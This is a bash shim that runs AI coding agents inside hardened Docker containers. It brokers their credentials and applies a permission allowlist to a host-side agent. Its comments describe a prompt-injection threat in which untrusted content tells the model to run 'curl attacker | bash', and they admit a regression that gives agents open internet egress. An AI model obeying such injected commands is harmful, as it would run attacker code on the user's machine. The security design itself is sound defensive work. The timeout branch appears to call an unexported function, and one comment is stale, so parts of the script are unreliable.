#!/usr/bin/env bash
# gc-docker-runner — host-side shim that translates an agent invocation
# from Gas City into a `docker run` against gascity-agent-runner.
#
# Symlinked as `claude` (and optionally `codex`, `gemini`, etc.) earlier
# on PATH than the real binaries. argv[0] decides which agent to launch:
#   /usr/local/bin/claude → reads image[claude] from config
#   /usr/local/bin/codex  → reads image[codex]  from config
#
# Reference: docs/containerizing-gascity-for-local-use-spec.md §3.2, §4.

set -euo pipefail

CONFIG="${GC_DOCKER_RUNNER_CONFIG:-$HOME/.config/gascity-docker-runner/config.toml}"
LOG_DIR="${GC_DOCKER_RUNNER_LOG_DIR:-$HOME/.local/state/gascity-docker-runner/logs}"
SHIM_DIR="${GC_DOCKER_RUNNER_SHIM_DIR:-$HOME/.local/bin/gascity-shims}"

# Permission-handling policy differs by agent scope:
#
# - Polecats (docker path): claude runs inside a --cap-drop ALL,
#   --read-only container with no host mounts beyond the rig worktree
#   and no internet egress except via brokers. The container IS the
#   security boundary; in-container permission prompts are theatre.
#   → pass --dangerously-skip-permissions.
#
# - Mayor / city-scoped (passthrough): claude runs on the host with
#   full user privileges. Prompts are the last line of defense against
#   prompt injection (an untrusted README, PR body, or WebFetch reply
#   telling the model to `curl attacker | bash`). We do NOT blanket-
#   skip here. Instead we point claude at a curated allowlist via
#   --settings; safe reads and inspection commands (ls, cat, grep, git
#   log, gc *, gh pr view, docker ps, ...) auto-approve, everything
#   else still prompts. Config lives at
#   $HOME/.config/gascity-docker-runner/mayor-permissions.json (installed
#   by containerized/install.sh from configs/; preserved across
#   re-installs so user edits stick).
#
# Opt-out per shell:
#   GC_DOCKER_SKIP_PERMISSIONS=0   # polecats prompt like normal
#   GC_MAYOR_SETTINGS=/dev/null    # no mayor allowlist (everything prompts)
MAYOR_SETTINGS="${GC_MAYOR_SETTINGS:-$HOME/.config/gascity-docker-runner/mayor-permissions.json}"

# --- Which agent are we standing in for? -----------------------------------
AGENT_NAME="$(basename "$0")"
case "$AGENT_NAME" in
    claude|codex|gemini) ;;
    *) echo "[gc-docker-runner] FATAL invoked under unsupported name: $AGENT_NAME (expected claude|codex|gemini)" >&2; exit 64 ;;
esac

# --- Passthrough mode ------------------------------------------------------
# Containerize only when this is a rig-scoped agent invocation — gc sets
# GC_RIG (the rig name) and GC_DIR (the agent's worktree path) for those.
# City-scoped agents (mayor, deacon, boot) get neither; their `claude`
# should run on the host. Same for any accidental interactive invocation.
#
# Note: an older draft of the spec used GC_RIG_PATH; the actual gc binary
# exports GC_RIG / GC_RIG_ROOT / GC_DIR. We accept the old name as a
# fallback so anyone who set GC_RIG_PATH manually still gets the docker
# path.
if [ -z "${GC_RIG:-}${GC_RIG_PATH:-}" ]; then
    REAL_BIN_FILE="$SHIM_DIR/.real-$AGENT_NAME"
    if [ ! -f "$REAL_BIN_FILE" ]; then
        echo "[gc-docker-runner] FATAL no real-binary sidecar at $REAL_BIN_FILE — re-run containerized/install.sh" >&2
        exit 64
    fi
    REAL_BIN="$(cat "$REAL_BIN_FILE")"
    if [ ! -x "$REAL_BIN" ]; then
        echo "[gc-docker-runner] FATAL real $AGENT_NAME at $REAL_BIN is missing or not executable" >&2
        echo "[gc-docker-runner]       (claude auto-update may have moved it — re-run containerized/install.sh)" >&2
        exit 64
    fi
    # For the host-side mayor, apply the curated allowlist if it exists.
    # No --dangerously-skip-permissions here — mayor has full host access
    # so prompts on unknown tool calls are a security control, not noise.
    PASS_ARGS=()
    if [ "$AGENT_NAME" = "claude" ] && [ -f "$MAYOR_SETTINGS" ]; then
        PASS_ARGS+=( --settings "$MAYOR_SETTINGS" )
    fi
    exec "$REAL_BIN" ${PASS_ARGS[@]+"${PASS_ARGS[@]}"} "$@"
fi

mkdir -p "$LOG_DIR"

# --- Parse the (intentionally tiny) TOML config ---------------------------
# We only need a handful of keys; full TOML parsing in pure bash is overkill.
# Sed picks the value for `key = "value"` lines under each [section].
toml_get() {
    # NOTE: BSD awk on macOS reserves `in` as a keyword (array operator).
    # Don't use `in` as a variable — `inside` works in both BSD and GNU awk.
    local section="$1" key="$2"
    awk -v s="$section" -v k="$key" '
        $0 ~ "^\\["s"\\]" {inside=1; next}
        inside && $0 ~ "^\\[" {inside=0}
        inside && $0 ~ "^[[:space:]]*"k"[[:space:]]*=" {
            sub("^[^=]*=[[:space:]]*\"?", ""); sub("\"?[[:space:]]*$", "");
            print; exit
        }
    ' "$CONFIG" 2>/dev/null
}

if [ ! -f "$CONFIG" ]; then
    echo "[gc-docker-runner] FATAL no config at $CONFIG (run install.sh first)" >&2
    exit 64
fi

IMAGE="$(toml_get image "$AGENT_NAME")"
if [ -z "$IMAGE" ]; then
    echo "[gc-docker-runner] FATAL no image configured for agent '$AGENT_NAME' in $CONFIG" >&2
    exit 64
fi

# Fail loud (not silent) if the configured image is missing. Without this
# check, an `exec claude …` invocation would silently exit 0 / 125, which
# is impossible to debug — especially if the shim has been put on a global
# PATH by accident and intercepts the user's normal `claude` use.
if ! docker image inspect "$IMAGE" >/dev/null 2>&1; then
    cat >&2 <<EOF
[gc-docker-runner] FATAL image not present: $IMAGE
                   build it with:
                     cd <learning-gascity>/containerized
                     docker build -t $IMAGE agent-runner/
                   or remove the shim from PATH if you didn't mean to use it.
EOF
    exit 125
fi

LIM_MEM="$(toml_get limits memory)"; : "${LIM_MEM:=4g}"
LIM_CPU="$(toml_get limits cpus)";   : "${LIM_CPU:=2}"
LIM_PIDS="$(toml_get limits pids_limit)"; : "${LIM_PIDS:=512}"
TIMEOUT="$(toml_get limits timeout)"; : "${TIMEOUT:=30m}"

# v2 network policy (compromised — see KNOWN REGRESSION below):
#
# The original v2 design put agents on gc-broker-net (--internal, no
# internet route), with brokers as the only egress. That WORKED in the
# lab. In reality, Claude Code 2.1.x has hardcoded api.anthropic.com
# calls (OAuth roles/session/telemetry) that bypass ANTHROPIC_BASE_URL
# and dead-end on --internal DNS resolution — the agent prints
# "Failed to connect to api.anthropic.com: ESERVFAIL" and aborts
# before the first /v1/messages call.
#
# Interim fix: attach agents to gc-egress-net (bridge, has internet).
# Brokers are on both networks so their container names still resolve.
# The broker STILL intercepts /v1/messages (real OAuth bearer stays in
# the broker, dummy ANTHROPIC_API_KEY in the container). What we lose
# is egress isolation: an agent can now reach any public host.
#
# Follow-up (KNOWN REGRESSION): run broker on 443/HTTPS with a
# self-signed cert claude trusts via NODE_EXTRA_CA_CERTS + docker
# --add-host api.anthropic.com=<broker-ip>. Then agents can go back
# on gc-broker-net --internal and the broker sees literally everything
# claude asks for.
LEGACY_NETWORK="$(toml_get network mode)"
NETWORK="gc-egress-net"
if [ -n "$LEGACY_NETWORK" ] && [ "$LEGACY_NETWORK" != "$NETWORK" ] && [ "$LEGACY_NETWORK" != "bridge" ] && [ "$LEGACY_NETWORK" != "gc-broker-net" ]; then
    echo "[gc-docker-runner] warn: [network] mode=$LEGACY_NETWORK is ignored under v2 (forced to $NETWORK)" >&2
fi

# --- Resolve the rig path --------------------------------------------------
# Mount the agent's per-agent worktree (GC_DIR) at /work — that's the
# scoped sandbox gc set up for this agent, distinct from the rig source
# at GC_RIG_ROOT. Fall back to GC_RIG_PATH (legacy spec env var name).
RIG_PATH="${GC_DIR:-${GC_RIG_PATH:-}}"
if [ -z "$RIG_PATH" ]; then
    echo "[gc-docker-runner] FATAL GC_DIR (and GC_RIG_PATH) are unset — gc must set the agent worktree path" >&2
    exit 64
fi
if [ ! -d "$RIG_PATH" ]; then
    echo "[gc-docker-runner] FATAL agent worktree does not exist: $RIG_PATH" >&2
    exit 64
fi

# --- Container name --------------------------------------------------------
# gc exports GC_AGENT (e.g. "demo-rig/claude-1") and GC_BEAD_ID for a
# bead-backed session. Older specs called these GC_AGENT_NAME / GC_BEAD;
# accept both. Docker container names allow [a-zA-Z0-9_.-], so substitute
# "/" and other forbidden chars for "_".
SAFE_AGENT="${GC_AGENT:-${GC_AGENT_NAME:-anon}}"
SAFE_BEAD="${GC_BEAD_ID:-${GC_BEAD:-nobead}}"
NAME="gc-${SAFE_AGENT//[^a-zA-Z0-9_.-]/_}-${SAFE_BEAD//[^a-zA-Z0-9_.-]/_}"
LOG_FILE="$LOG_DIR/${GC_SESSION_ID:-$$}.log"

# --- Forwarded env (whitelist) --------------------------------------------
# Only forward what the agent + supervisor need. Everything else is dropped.
#
# v2: ANTHROPIC_API_KEY / OPENAI_API_KEY / GOOGLE_API_KEY / CLAUDE_API_KEY
# / GH_TOKEN are NOT in this list. Those credentials live in the broker
# containers; agents reach them via the broker base URLs injected below.
# Forwarding the env vars too would let the agent's CLI prefer them
# (claude-code does ANTHROPIC_API_KEY > ANTHROPIC_BASE_URL+OAuth) and
# bypass the broker entirely.
FORWARD_ENV=(
    GC_RIG
    GC_RIG_ROOT
    GC_RIG_PREFIX
    GC_BEAD_ID
    GC_AGENT
    GC_AGENT_NAME
    GC_SESSION_ID
    GC_TEMPLATE
    GC_PROVIDER
    GC_GIT_USER
    GC_GIT_EMAIL
)
ENV_FLAGS=()
for v in "${FORWARD_ENV[@]}"; do
    if [ -n "${!v:-}" ]; then
        ENV_FLAGS+=( -e "$v" )
    fi
done

# v2: injected env (always set, regardless of host env). These point the
# agent at the brokers on gc-broker-net. The agent has no other route
# off the docker-internal network, so these URLs are the only way it
# can reach Anthropic / GitHub at all.
#
# ANTHROPIC_API_KEY note: we inject a dummy value ON PURPOSE. Claude
# Code's default auth flow tries OAuth first, which reaches out to
# api.anthropic.com directly (bypassing ANTHROPIC_BASE_URL) and dies
# on the container's --internal network with "ESERVFAIL". Setting
# ANTHROPIC_API_KEY to any non-empty value flips the client into
# API-key mode: it skips OAuth entirely and sends the API request to
# ANTHROPIC_BASE_URL. The broker then strips whatever Authorization
# header the client sent and injects the real OAuth bearer from
# Keychain. So the dummy never leaves the container; the real token
# is only ever in the broker's process memory.
INJECT_ENV=(
    "ANTHROPIC_BASE_URL=http://gc-broker-anthropic:8080"
    "ANTHROPIC_API_KEY=broker-managed-dummy-value-do-not-use"
    "GITHUB_API_URL=http://gc-broker-github-api:8080"
    "SSH_AUTH_SOCK=/run/sshagent/gc.sock"
    "GIT_SSH_COMMAND=ssh -F /etc/ssh/ssh_config_gc"
)
for kv in "${INJECT_ENV[@]}"; do
    ENV_FLAGS+=( -e "$kv" )
done

# --- docker run ------------------------------------------------------------
# Every flag here has a reason. See spec §4 before stripping anything.
exec_docker() {
    docker run \
        --rm \
        --name "$NAME" \
        --user 1000:1000 \
        --read-only \
        --tmpfs "/tmp:size=512m,mode=1777" \
        --tmpfs "/home/agent/.cache:size=512m" \
        --workdir /work \
        -v "$RIG_PATH:/work:rw,Z" \
        -v "gc-sshagent-sock:/run/sshagent:ro" \
        --network "$NETWORK" \
        --memory="$LIM_MEM" \
        --cpus="$LIM_CPU" \
        --pids-limit="$LIM_PIDS" \
        --cap-drop=ALL \
        --security-opt=no-new-privileges \
        "${ENV_FLAGS[@]}" \
        --interactive \
        $( [ -t 0 ] && echo --tty ) \
        "$IMAGE" \
        "$AGENT_NAME" ${DOCKER_CLAUDE_ARGS[@]+"${DOCKER_CLAUDE_ARGS[@]}"} ${FILTERED_ARGS[@]+"${FILTERED_ARGS[@]}"}
}

# For the polecats path, the container is the security boundary — safe
# to blanket-skip permission prompts inside. Assembled here so it's
# obvious the policy is docker-only.
DOCKER_CLAUDE_ARGS=()
if [ "${GC_DOCKER_SKIP_PERMISSIONS:-1}" != "0" ] && [ "$AGENT_NAME" = "claude" ]; then
    DOCKER_CLAUDE_ARGS+=( --dangerously-skip-permissions )
fi

# gc-supervisor passes `--settings /path/on/host/.gc/settings.json` to
# every claude invocation. That file contains gc-integration hooks
# (PreCompact, SessionStart, UserPromptSubmit) whose commands invoke
# the *host* `gc` binary — which isn't in the polecats container. The
# host path also isn't visible in the container (only /work is mounted),
# so claude aborts with "Settings file not found" before the hook
# would even fire.
#
# Fix: rewrite --settings <host-path> to --settings '{}' (empty inline
# JSON — --settings accepts either a file path or a JSON literal per
# claude --help). Preserves the flag's shape without dragging in the
# unusable file. Empty JSON = no hooks, no MCP servers, no policy —
# the polecats agent's job is to work the bead, and gc's telemetry
# hooks aren't needed for that.
#
# Any --settings value that DOESN'T look like a host path (already-
# inline JSON, or a container-friendly /work/* path) passes through.
FILTERED_ARGS=()
_skip_next=0
for _arg in "$@"; do
    if [ "$_skip_next" = "1" ]; then
        _skip_next=0
        # Replace host-absolute paths with empty JSON; pass everything
        # else (e.g. already a JSON literal, or /work/... in-container).
        case "$_arg" in
            /Users/*|/home/*|/tmp/*|/var/*|/opt/*|/private/*)
                FILTERED_ARGS+=( '{}' ) ;;
            *)
                FILTERED_ARGS+=( "$_arg" ) ;;
        esac
        continue
    fi
    if [ "$_arg" = "--settings" ]; then
        _skip_next=1
    fi
    FILTERED_ARGS+=( "$_arg" )
done

# --- Signal forwarding -----------------------------------------------------
# Trap SIGTERM/SIGINT, ask docker to stop the container with a 10s grace,
# then exit. Without this, `gc stop` would TERM the shim but leave the
# container running until the agent process exits naturally.
cleanup() {
    docker stop --time=10 "$NAME" 2>/dev/null || true
}
trap cleanup TERM INT

# --- Run with timeout + tee logs ------------------------------------------
{
    echo "[gc-docker-runner] $(date -u +%FT%TZ) launch agent=$AGENT_NAME bead=${GC_BEAD_ID:-?} session=${GC_SESSION_ID:-?} image=$IMAGE"
    echo "[gc-docker-runner] rig=$RIG_PATH name=$NAME timeout=$TIMEOUT"
} >> "$LOG_FILE"

# Convert "30m" / "2h" / "90s" into a seconds count for `timeout`.
parse_dur() {
    local d="$1" n="${1%[smhd]}" u="${1: -1}"
    case "$u" in
        s) echo "$n" ;;
        m) echo $((n * 60)) ;;
        h) echo $((n * 3600)) ;;
        d) echo $((n * 86400)) ;;
        *) echo "$d" ;;
    esac
}
TIMEOUT_SECS="$(parse_dur "$TIMEOUT")"

if command -v timeout >/dev/null 2>&1; then
    timeout --signal=TERM --kill-after=15s "$TIMEOUT_SECS" \
        bash -c 'exec_docker "$@"' bash "$@" 2>&1 | tee -a "$LOG_FILE"
else
    # macOS: GNU timeout is `gtimeout` from coreutils; if missing we run
    # without a hard timeout and rely on the agent to terminate.
    exec_docker "$@" 2>&1 | tee -a "$LOG_FILE"
fi
RC=${PIPESTATUS[0]}

echo "[gc-docker-runner] $(date -u +%FT%TZ) exit rc=$RC" >> "$LOG_FILE"
exit "$RC"
